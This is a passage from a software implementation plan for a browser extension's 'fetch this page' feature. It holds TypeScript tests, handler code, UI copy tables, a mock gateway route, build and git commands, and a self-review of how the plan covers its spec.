  readonly fetchItem: (
    origin: string,
    token: string,
    pageUrl: string,
  ) => Promise<
    | { ok: true; outcome: FetchOutcome }
    | { ok: false; reason: FetchError; scopeGap?: { required: string; granted: string[] } }
  >;
}

/**
 * A targeted fetch causes an OUTBOUND request to a provider under the user's
 * stored credential. The recogniser is therefore a hard gate here, exactly as it
 * is for resolve — and for a stronger reason: resolve reads the local index,
 * this one leaves the machine.
 */
export async function handleFetch(deps: FetchDeps, req: FetchRequest): Promise<FetchResponse> {
  const recognition = recognise(req.pageUrl, await deps.getOrigins());
  if (!recognition.ok) {
    return { kind: "fetch", ok: false, recognition, reason: "server_error" };
  }
  const conn = await deps.getConnection();
  if (conn === null) {
    return { kind: "fetch", ok: false, recognition, reason: "not_paired" };
  }
  const r = await deps.fetchItem(conn.origin, conn.token, recognition.resolveUrl);
  if (!r.ok) {
    return r.scopeGap === undefined
      ? { kind: "fetch", ok: false, recognition, reason: r.reason }
      : {
          kind: "fetch",
          ok: false,
          recognition,
          reason: r.reason,
          scopeGap: { label: conn.label, ...r.scopeGap },
        };
  }
  return { kind: "fetch", ok: true, recognition, outcome: r.outcome };
}
```

`service-worker.ts` — route it beside the resolve case, injecting `fetchItem` from the client and the same `getOrigins` / `getConnection` deps `handleResolve` uses.

- [ ] **Step 4: Run the tests**

Run: `bun run typecheck && bun run test`
Expected: typecheck clean, all PASS.

- [ ] **Step 5: Commit**

```bash
git add src test
git commit -m "feat(background): add the fetch message, guards and recogniser gate"
```

---

### Task 6: The header states

**Files:** Modify `src/panel/panel-view.ts`. Test: `test/unit/panel-view.test.ts`.

**Interfaces:**
- Produces:
  ```ts
  | { kind: "not-indexed"; surface: string; product: Product; fetchable: boolean }
  | { kind: "fetching"; surface: string; product: Product }
  | { kind: "fetch-blocked"; surface: string; product: Product;
      reason: "unfetchable" | "not-configured" | "needs-fetch-scope";
      scopeGap: ScopeGap | null }
  | { kind: "fetch-retry"; surface: string; reason: "rate-limited" | "still-working" }
  ```
  `renderHeader(doc, state, onChoose?, onFetch?)` — `onFetch: (action: "fetch" | "resolve") => void`.

- [ ] **Step 1: Write the failing tests**

```ts
describe("renderHeader — fetch affordance", () => {
  it("offers the button only when the miss is fetchable, naming the product", () => {
    const yes = renderHeader(document, {
      kind: "not-indexed", surface: "GitHub PR · a/b #1", product: "github", fetchable: true,
    });
    const btn = yes.querySelector("button");
    expect(btn?.textContent).toBe("Fetch this from GitHub");

    const no = renderHeader(document, {
      kind: "not-indexed", surface: "GitHub PR · a/b #1", product: "github", fetchable: false,
    });
    expect(no.querySelector("button")).toBeNull();
    expect(no.textContent).toContain("Not indexed.");
  });

  it("reports the click", () => {
    const seen: string[] = [];
    const el = renderHeader(
      document,
      { kind: "not-indexed", surface: "S", product: "jira", fetchable: true },
      undefined,
      (a) => seen.push(a),
    );
    (el.querySelector("button") as HTMLButtonElement).click();
    expect(seen).toEqual(["fetch"]);
  });

  it("shows progress with no button while fetching", () => {
    const el = renderHeader(document, { kind: "fetching", surface: "S", product: "github" });
    expect(el.textContent).toContain("Fetching from GitHub");
    expect(el.querySelectorAll("button")).toHaveLength(0);
  });
});

describe("renderHeader — fetch outcomes", () => {
  it("names the connector on not-configured, from the recognised product", () => {
    const el = renderHeader(document, {
      kind: "fetch-blocked", surface: "S", product: "github",
      reason: "not-configured", scopeGap: null,
    });
    expect(el.textContent).toContain("No GitHub connector is configured");
    // Terminal: retrying will never work, which is why this arm is not collapsed.
    expect(el.querySelectorAll("button")).toHaveLength(0);
  });

  it("says plainly that it cannot fetch, with no action", () => {
    const el = renderHeader(document, {
      kind: "fetch-blocked", surface: "S", product: "github",
      reason: "unfetchable", scopeGap: null,
    });
    expect(el.textContent).toContain("can't fetch this page");
    expect(el.querySelectorAll("button")).toHaveLength(0);
  });

  it("names the fetch scope — not resolve — and builds the command", () => {
    const el = renderHeader(document, {
      kind: "fetch-blocked", surface: "S", product: "github", reason: "needs-fetch-scope",
      scopeGap: { label: "chrome", required: "fetch", granted: ["clip", "briefs", "resolve"] },
    });
    expect(el.textContent).toContain("nimbus clip scopes chrome --set clip,briefs,resolve,fetch");
    expect(el.textContent).not.toContain("<label>");
  });

  it("offers a fetch retry on a rate limit", () => {
    const seen: string[] = [];
    const el = renderHeader(
      document,
      { kind: "fetch-retry", surface: "S", reason: "rate-limited" },
      undefined,
      (a) => seen.push(a),
    );
    expect(el.textContent).toContain("Rate limited");
    (el.querySelector("button") as HTMLButtonElement).click();
    expect(seen).toEqual(["fetch"]);
  });

  it("on a timeout, never claims failure and retries the RESOLVE, not the fetch", () => {
    const seen: string[] = [];
    const el = renderHeader(
      document,
      { kind: "fetch-retry", surface: "S", reason: "still-working" },
      undefined,
      (a) => seen.push(a),
    );
    expect(el.textContent).toContain("Still working");
    expect(el.textContent?.toLowerCase()).not.toContain("failed");
    expect(el.textContent?.toLowerCase()).not.toContain("couldn't fetch");
    (el.querySelector("button") as HTMLButtonElement).click();
    // The whole point: a recovery click must not fire a second outbound request.
    expect(seen).toEqual(["resolve"]);
  });
});
```

- [ ] **Step 2: Run and watch them fail**

Run: `bunx vitest run test/unit/panel-view.test.ts`
Expected: FAIL — the arms and the `onFetch` parameter do not exist.

- [ ] **Step 3: Implement**

Add a `PRODUCT_NAMES` import or local table (mirror `surfaces-view.ts` — one spelling of each product name), an `actionButton` helper mirroring `chooser`'s button construction (`type="button"`, `textContent`, `addEventListener`), the four arms, and their renders. Thread `onFetch` through `renderShell` as a fourth optional parameter, leaving the lane loop untouched.

Copy, exactly:

| State | Text |
| --- | --- |
| `not-indexed` + fetchable | "Not indexed." + button `Fetch this from <Product>` |
| `fetching` | `Fetching from <Product>…` |
| `fetch-blocked` / `unfetchable` | "Nimbus can't fetch this page." |
| `fetch-blocked` / `not-configured` | `No <Product> connector is configured on your gateway.` |
| `fetch-blocked` / `needs-fetch-scope` | "This pairing can't fetch pages yet." + `Grant it on the gateway: <scopeCommand>` |
| `fetch-retry` / `rate-limited` | "Rate limited — try again shortly." + button `Try again` |
| `fetch-retry` / `still-working` | "Still working — your gateway may not have finished. Nothing was lost." + button `Check again` |

Keep the `_never` exhaustiveness guard satisfied.

- [ ] **Step 4: Run the tests**

Run: `bun run typecheck && bunx vitest run test/unit/panel-view.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/panel/panel-view.ts test/unit/panel-view.test.ts
git commit -m "feat(panel): render the fetch affordance and its outcomes"
```

---

### Task 7: The panel state machine

**Files:** Modify `src/panel/panel-in-page.ts`. Test: `test/unit/panel-in-page.test.ts`.

- [ ] **Step 1: Write the failing tests**

```ts
it("fetches on click, then re-resolves to show the item", async () => {
  const sent: string[] = [];
  const panel = await mountPanelWithScript(sent, /* resolve miss, then found */);

  (panel.querySelector("button") as HTMLButtonElement).click();
  await flush();

  expect(sent).toEqual(["resolve", "fetch", "resolve"]);
  expect(panel.textContent).toContain("Indexed just now");
});

it("after a timeout, Check again re-resolves and does NOT fetch again", async () => {
  const sent: string[] = [];
  const panel = await mountPanelWithScript(sent, /* resolve miss, then fetch timeout */);

  (panel.querySelector("button") as HTMLButtonElement).click();
  await flush();
  expect(panel.textContent).toContain("Still working");

  (panel.querySelector("button") as HTMLButtonElement).click();
  await flush();

  // One fetch, ever. The recovery click is a resolve.
  expect(sent.filter((k) => k === "fetch")).toHaveLength(1);
  expect(sent[sent.length - 1]).toBe("resolve");
});

it("does not re-offer the Fetch button when the recovery resolve is still a miss", async () => {
  const sent: string[] = [];
  const panel = await mountPanelWithScript(sent, /* miss, timeout, then miss again */);

  (panel.querySelector("button") as HTMLButtonElement).click();   // Fetch
  await flush();
  (panel.querySelector("button") as HTMLButtonElement).click();   // Check again
  await flush();

  // Falling back to not-indexed would restore the Fetch button and allow a second
  // outbound request for work possibly still in flight.
  expect(panel.textContent).toContain("Still working");
  expect(panel.textContent).not.toContain("Fetch this from");
  expect(sent.filter((k) => k === "fetch")).toHaveLength(1);
});
```

Extend the file's existing mount helper to script a sequence of responses keyed by message kind, recording each kind sent.

- [ ] **Step 2: Run and watch them fail**

Run: `bunx vitest run test/unit/panel-in-page.test.ts`
Expected: FAIL — no fetch wiring.

- [ ] **Step 3: Implement**

Add beside the existing `chosen` state:

```ts
  /**
   * Once a fetch has been sent, the Fetch button never returns for the life of
   * this panel — not even if a recovery resolve is still a miss.
   *
   * The panel cannot tell "still fetching" from "the fetch died", so re-offering
   * the button would let a user fire a second outbound request for work that may
   * be in flight. Reopening the panel resets this, which is the deliberate escape
   * hatch: a fresh resolve either finds the item or offers the button again, by
   * which point the original fetch has landed or genuinely failed.
   */
  let fetchSent = false;
  let fetchState: HeaderState | null = null;
```

`headerFrom` gains `fetchable` and `product` on the `not-indexed` arm, suppressing the button when `fetchSent`. A `fetchOutcomeHeader(res)` maps a `FetchResponse` to `fetching` / `fetch-blocked` / `fetch-retry`, and `indexed` re-sends `resolve`. The `onFetch` callback dispatches on its `"fetch" | "resolve"` argument.

- [ ] **Step 4: Run the tests**

Run: `bun run typecheck && bun run test`
Expected: typecheck clean, all PASS.

- [ ] **Step 5: Commit**

```bash
git add src/panel/panel-in-page.ts test/unit/panel-in-page.test.ts
git commit -m "feat(panel): wire the fetch state machine, one fetch per panel"
```

---

### Task 8: Mock gateway, docs, and the full green bar

**Files:** `scripts/screenshots/mock-gateway.ts`, `scripts/screenshots/gateway-fixtures.ts`, `CHANGELOG.md`, `docs/architecture.md`, `ROADMAP.md`, `docs/development.md`. Test: `test/unit/mock-gateway.test.ts`.

- [ ] **Step 1: Write the failing test**

```ts
it("serves POST /v1/items/fetch with an indexed outcome", async () => {
  const res = await handleRequest(
    new Request("http://127.0.0.1:8765/v1/items/fetch", {
      method: "POST",
      headers: { authorization: "Bearer test-token", "content-type": "application/json" },
      body: JSON.stringify({ url: "https://github.com/acme/web/pull/482" }),
    }),
  );
  expect(res.status).toBe(200);
  expect(await res.json()).toEqual({ status: "indexed", itemId: expect.any(String) });
});
```

- [ ] **Step 2: Run and watch it fail**

Run: `bunx vitest run test/unit/mock-gateway.test.ts`
Expected: FAIL — the route is unhandled.

- [ ] **Step 3: Implement and document**

Add the route to the mock's POST branch returning a fixed `FETCH_FIXTURE`; add the fixture beside `RESOLVE_FIXTURE`.

`CHANGELOG.md` under `## [Unreleased]`:

```markdown
### Added

- On a page Nimbus recognises but has not indexed, the panel now offers to fetch
  that one item through the connector that owns it. Nothing is fetched until you
  ask: the button names what it will fetch and from where.

### Changed

- Scope guidance now names your actual device and the exact scopes to set, instead
  of a placeholder you had to edit by hand. It also preserves scopes you already
  hold — the previous text could silently drop one.
```

`docs/architecture.md`: the fetch route, the six-to-four collapse, why a timeout is not a failure, and the one-fetch-per-panel rule.

`docs/development.md`: manual steps for the fetch path — a recognised, unindexed, fetchable page; the not-configured case; and the 403 with only `resolve` granted.

`ROADMAP.md`: mark C3.1 shipped, noting the lanes half of its done-when belongs to C2.

- [ ] **Step 4: Run the full green bar**

Run: `bun run typecheck && bun run lint && bun run test && bun run build && bun run check-build`
Expected: all five PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts CHANGELOG.md docs ROADMAP.md test
git commit -m "docs+fixtures: track the targeted-fetch route"
```

---

## Self-Review

**Spec coverage:**

| Spec decision | Task |
| --- | --- |
| Explicit click, never automatic | 6 (button), 7 (only path that sends `fetch`) |
| Six arms collapse by actionability | 3 (types), 4 (parser), 6 (copy) |
| `not_configured` stays distinct | 3, 4, 6 |
| Timeout ≠ failure; recovery re-resolves | 3 (`timeout`), 4 (AbortError split), 6, 7 |
| One fetch per panel, no re-offer on a recovery miss | 7 |
| Panel orchestrates; SW is thin transport | 5, 7 |
| Scope command built from `granted` + real label | 2 |
| `service` pruned from `ambiguous` | 1 |
| Copy lives in `panel-view.ts` | 6 (arms carry `reason`/`product`, never prose) |
| Recogniser gates the outbound write | 5 |

**Placeholder scan:** the only prose-only steps are Task 8's doc edits, which name the exact files and the content required. Task 7's test bodies reference a `mountPanelWithScript` helper the implementer extends from the file's existing mount helper — the assertions are complete, the harness is not, and that is called out in the step.

**Type consistency:** `ScopeGap` is defined once in `types.ts` (Task 2) and consumed by `messages.ts`, `handlers.ts` and `panel-view.ts`. The client's internal 403 shape is `{required, granted}` without a label; the label is attached in `handlers.ts`, which is the only layer holding a `Connection`. `FetchOutcome`'s `kind` values (`indexed`/`unfetchable`/`not-configured`/`rate-limited`) are used identically in Tasks 3, 4, 5 and 7.

**Out of scope, deliberately:** C4.2's confirm dialog, C4.1's egress log, the C2 lanes, a rate-limit cooldown, and refactoring `unreachable` in the other three clients.
